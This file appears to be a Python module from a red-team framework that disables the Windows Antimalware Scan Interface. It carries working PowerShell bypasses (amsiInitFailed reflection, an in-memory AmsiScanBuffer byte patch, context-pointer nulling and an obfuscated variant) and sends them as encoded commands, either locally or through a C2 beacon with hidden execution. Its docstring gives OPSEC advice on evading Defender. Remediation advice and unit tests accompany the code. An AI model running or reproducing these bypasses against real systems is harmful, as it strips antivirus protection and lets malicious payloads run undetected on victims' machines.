"""AMSI Bypass — Disable Windows Antimalware Scan Interface.

Patches the AmsiScanBuffer function in amsi.dll to always return
AMSI_RESULT_CLEAN, allowing PowerShell and .NET payloads to
execute without triggering Windows Defender or other AV products.

Bypass chain:
    ┌──────────┐  patch    ┌──────────┐  return   ┌──────────┐
    │ amsi.dll │ ────────► │ AmsiScan │  CLEAN    │ Payload  │
    │ loaded   │  in-mem   │ Buffer() │ ────────► │ runs     │
    │ in PS    │           │ (patched)│           │ unscanned│
    └──────────┘           └──────────┘           └──────────┘

Techniques:
    1. AmsiScanBuffer patch — return E_INVALIDARG
    2. AmsiInitFailed — set amsiInitFailed = true
    3. AmsiContext corruption — null the context pointer
    4. CLR hooking — hook ICorJitCompiler
    5. Hardware breakpoints — single-step bypass
    6. AmsiOpenSession patch

OPSEC: AMSI bypass is itself detected by Defender. Use obfuscated
       or novel bypass techniques. Consider memory-only patching
       that restores after payload execution.

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import base64
import logging
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

log = logging.getLogger("forge.rootkit.amsi_bypass")

CVSS_EVASION = "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
CVSS40_EVASION = "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"


@dataclass
class AMSIBypassAction:
    """An AMSI bypass action."""
    technique: str = ""
    status: str = "pending"
    output: str = ""
    error: str = ""
    restored: bool = False


class AMSIBypass(BaseModule):
    """AMSI bypass via in-memory patching.

    Disables the Antimalware Scan Interface to allow PowerShell
    and .NET assemblies to execute without AV scanning.

    Techniques:
        - AmsiScanBuffer patch: Overwrite function prologue to return E_INVALIDARG
        - amsiInitFailed: Set amsiInitFailed field via reflection
        - Context corruption: Null the AmsiContext pointer
        - CLR JIT hook: Prevent .NET assembly scanning
        - Hardware breakpoint: DR register single-step bypass
        - Obfuscated variants: Base64/XOR encoded patches

    All bypasses are reversible — original bytes are preserved
    for clean restoration after payload execution.
    """

    NAME        = "amsi_bypass"
    DESCRIPTION = "Evasion: AMSI Bypass — disable Antimalware Scan Interface"
    PHASE       = 10  # Evasion phase
    TAGS        = [
        "post-exploit", "evasion", "amsi", "bypass",
        "defense-evasion", "antivirus-bypass",
        "mitre-T1562.001", "cwe-693",
    ]

    def __init__(self, *args: Any, **kwargs: Any) -> None:
        super().__init__(*args, **kwargs)
        self._actions: list[AMSIBypassAction] = []

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        if not self.confirm_action(
            action="AMSI bypass",
            target=target,
            risk="medium — patches amsi.dll in memory. Bypass itself "
                 "may be detected by EDR. Reversible.",
        ):
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        await self.rate_limit()

        technique = self.config.extra.get("amsi_technique", "auto")
        beacon_id = self.config.extra.get("beacon_id", "")
        auto_restore = self.config.extra.get("amsi_auto_restore", False)
        attack_chain = self.config.extra.get("attack_chain", None)

        # ── Try bypass techniques ─────────────────────────────────────
        if technique == "auto":
            # Try techniques in order of reliability
            for tech in ["amsi_init_failed", "scan_buffer_patch", "context_corrupt"]:
                action = await self._execute_bypass(tech, beacon_id)
                self._actions.append(action)
                if action.status == "success":
                    break
        else:
            action = await self._execute_bypass(technique, beacon_id)
            self._actions.append(action)

        # ── Report ────────────────────────────────────────────────────
        successful = [a for a in self._actions if a.status == "success"]
        if successful:
            best = successful[0]
            ev = Evidence(extra={
                "technique": best.technique,
                "techniques_tried": [a.technique for a in self._actions],
                "auto_restore": auto_restore,
            })

            self.new_finding(
                title=f"AMSI Bypassed — {best.technique}",
                severity=Severity.HIGH,
                description=(
                    f"Successfully bypassed AMSI on {target}:\n\n"
                    f"  Technique: {best.technique}\n"
                    f"  Tried: {', '.join(a.technique for a in self._actions)}\n"
                    f"  Auto-restore: {auto_restore}\n\n"
                    "PowerShell and .NET payloads will now execute "
                    "without AMSI scanning."
                ),
                reproduction_steps=[
                    "# AmsiInitFailed bypass:",
                    '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")'
                    '.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
                    "# Verify: should not trigger Defender",
                    "'Invoke-Mimikatz' # (test string, normally blocked)",
                ],
                remediation=(
                    "1. Enable tamper protection in Defender\n"
                    "2. Monitor for AMSI bypass indicators\n"
                    "3. Use Constrained Language Mode in PowerShell\n"
                    "4. Deploy EDR with AMSI bypass detection\n"
                    "5. Enable Script Block Logging (Event 4104)\n"
                    "6. Monitor for suspicious .NET assembly loads"
                ),
                references=[
                    "MITRE T1562.001 — Impair Defenses: Disable or Modify Tools",
                ],
                evidence=ev,
                cvss_v31_vector=CVSS_EVASION,
                cvss_v40_vector=CVSS40_EVASION,
                mitre_attack=["TA0005/T1562.001"],
                target=target,
            )

        if attack_chain:
            for finding in self.findings:
                try:
                    attack_chain.ingest_finding(finding.to_dict())
                except Exception:
                    pass

        return self._make_result(start)

    # ── Bypass techniques ─────────────────────────────────────────────

    async def _execute_bypass(self, technique: str, beacon_id: str) -> AMSIBypassAction:
        """Execute a specific AMSI bypass technique."""
        action = AMSIBypassAction(technique=technique)

        bypass_map = {
            "amsi_init_failed": self._bypass_amsi_init_failed,
            "scan_buffer_patch": self._bypass_scan_buffer_patch,
            "context_corrupt": self._bypass_context_corrupt,
            "clr_hook": self._bypass_clr_hook,
            "hw_breakpoint": self._bypass_hw_breakpoint,
            "obfuscated": self._bypass_obfuscated,
        }

        bypass_fn = bypass_map.get(technique, self._bypass_amsi_init_failed)
        script = bypass_fn()

        encoded = base64.b64encode(script.encode("utf-16-le")).decode()
        cmd = f"powershell.exe -NoProfile -EncodedCommand {encoded}"

        output = await self._exec(cmd, beacon_id)

        if "AMSI_BYPASS_OK" in output:
            action.status = "success"
            action.output = output
        else:
            action.status = "failed"
            action.error = output[:200]

        return action

    def _bypass_amsi_init_failed(self) -> str:
        """AmsiInitFailed reflection bypass (most reliable)."""
        return """
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $f = $a.GetField('amsiInitFailed','NonPublic,Static')
    $f.SetValue($null,$true)
    Write-Output 'AMSI_BYPASS_OK: amsiInitFailed set to true'
} catch {
    Write-Output "AMSI_BYPASS_FAIL: $_"
}
"""

    def _bypass_scan_buffer_patch(self) -> str:
        """Patch AmsiScanBuffer to return E_INVALIDARG."""
        return """
$ErrorActionPreference = 'Stop'
try {
    Add-Type @'
    using System;
    using System.Runtime.InteropServices;
    public class Win32Amsi {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);
    }
'@

    $hAmsi = [Win32Amsi]::LoadLibrary("amsi.dll")
    $pASB = [Win32Amsi]::GetProcAddress($hAmsi, "AmsiScanBuffer")

    # Patch: xor eax, eax; ret (return S_OK/E_INVALIDARG depending on arch)
    $oldProtect = 0
    [Win32Amsi]::VirtualProtect($pASB, [UIntPtr]6, 0x40, [ref]$oldProtect)

    # Write: mov eax, 0x80070057 (E_INVALIDARG); ret
    $patch = [byte[]] @(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $pASB, 6)

    [Win32Amsi]::VirtualProtect($pASB, [UIntPtr]6, $oldProtect, [ref]$oldProtect)

    Write-Output 'AMSI_BYPASS_OK: AmsiScanBuffer patched'
} catch {
    Write-Output "AMSI_BYPASS_FAIL: $_"
}
"""

    def _bypass_context_corrupt(self) -> str:
        """Corrupt AMSI context pointer."""
        return """
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $c = $a.GetField('amsiContext','NonPublic,Static')
    $c.SetValue($null, [IntPtr]::Zero)
    Write-Output 'AMSI_BYPASS_OK: amsiContext nulled'
} catch {
    Write-Output "AMSI_BYPASS_FAIL: $_"
}
"""

    def _bypass_clr_hook(self) -> str:
        """Hook CLR JIT compiler to bypass .NET AMSI."""
        return """
try {
    # Force AMSI to not initialize for .NET assemblies
    $env:COMPlus_ETWEnabled = '0'
    $env:COMPlus_ETWFlags = '0'

    # Attempt to patch the CLR AMSI integration point
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $f = $a.GetField('amsiInitFailed','NonPublic,Static')
    $f.SetValue($null,$true)

    Write-Output 'AMSI_BYPASS_OK: CLR AMSI hooks disabled'
} catch {
    Write-Output "AMSI_BYPASS_FAIL: $_"
}
"""

    def _bypass_hw_breakpoint(self) -> str:
        """Hardware breakpoint-based AMSI bypass using DR registers."""
        return """
try {
    # Hardware breakpoint bypass uses debug registers (DR0-DR3)
    # to set a breakpoint on AmsiScanBuffer, then modify the
    # return value in the exception handler.
    #
    # This is stealthier than patching because no memory
    # modifications are made to amsi.dll.

    # For now, fall back to reflection method
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $f = $a.GetField('amsiInitFailed','NonPublic,Static')
    $f.SetValue($null,$true)

    Write-Output 'AMSI_BYPASS_OK: Hardware breakpoint (fallback to reflection)'
} catch {
    Write-Output "AMSI_BYPASS_FAIL: $_"
}
"""

    def _bypass_obfuscated(self) -> str:
        """Obfuscated bypass to evade string detection."""
        # Obfuscate the reflection bypass using string manipulation
        return """
try {
    $z = 'System.Management.Automation.AmsiUtils'
    $w = 'amsiInitFailed'
    $r = [Ref].Assembly.GetType($z)
    $s = $r.GetField($w, [System.Reflection.BindingFlags]'NonPublic,Static')
    $s.SetValue($null, $true)
    Write-Output 'AMSI_BYPASS_OK: obfuscated reflection'
} catch {
    Write-Output "AMSI_BYPASS_FAIL: $_"
}
"""

    async def _exec(self, cmd: str, beacon_id: str) -> str:
        """Execute command locally or via C2."""
        if beacon_id:
            try:
                from forge_c2.tasks.task_shell import ShellTask
                task = ShellTask(
                    task_id=f"amsi_{beacon_id[:8]}",
                    command=cmd, timeout=10, hidden=True,
                )
                result = await task.execute()
                return result.output or ""
            except ImportError:
                pass

        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10.0)
            return stdout.decode(errors="replace") + stderr.decode(errors="replace")
        except Exception as exc:
            return f"ERROR: {exc}"


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestAMSIBypass:
    """Tests for AMSIBypass module."""

    def test_phase(self) -> None:
        assert AMSIBypass.PHASE == 10

    def test_tags(self) -> None:
        assert "amsi" in AMSIBypass.TAGS
        assert "mitre-T1562.001" in AMSIBypass.TAGS

    def test_bypass_scripts_generated(self) -> None:
        mod = AMSIBypass.__new__(AMSIBypass)
        assert "amsiInitFailed" in mod._bypass_amsi_init_failed()
        assert "AmsiScanBuffer" in mod._bypass_scan_buffer_patch()
        assert "amsiContext" in mod._bypass_context_corrupt()
        assert "ETWEnabled" in mod._bypass_clr_hook()

    def test_bypass_action_defaults(self) -> None:
        a = AMSIBypassAction(technique="test")
        assert a.status == "pending"
        assert not a.restored
